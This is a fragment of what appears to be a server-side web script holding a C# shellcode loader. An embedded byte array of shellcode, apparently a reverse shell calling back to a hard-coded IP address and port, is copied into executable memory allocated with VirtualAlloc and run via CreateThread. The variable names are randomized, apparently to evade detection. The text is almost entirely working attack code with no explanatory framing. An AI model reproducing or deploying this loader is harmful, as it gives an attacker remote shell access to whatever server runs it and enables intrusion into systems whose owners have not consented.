...
0x68,0x0a,0x0a,0x0e,0x20,0x68,0x02,0x00,0x05,0xbe,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr ia0G600Wi9G = VirtualAlloc(IntPtr.Zero,(UIntPtr)ntK4n1.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(ntK4n1,0,ia0G600Wi9G,ntK4n1.Length);
        IntPtr daq62nYo = IntPtr.Zero;
        IntPtr xGHl = CreateThread(IntPtr.Zero,UIntPtr.Zero,ia0G600Wi9G,IntPtr.Zero,0,ref daq62nYo);
    }
</script>
